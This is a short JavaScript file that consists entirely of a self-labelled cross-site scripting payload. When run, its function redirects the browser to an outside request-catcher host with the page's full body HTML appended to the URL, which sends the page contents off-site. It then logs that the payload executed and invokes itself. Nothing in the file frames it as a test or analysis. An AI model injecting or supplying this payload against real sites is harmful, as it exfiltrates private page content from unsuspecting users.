function xssPayload() {
  document.location="https://xss.requestcatcher.com/test"+document.body.innerHTML;
}

console.log('XSS payload executed');
xssPayload();
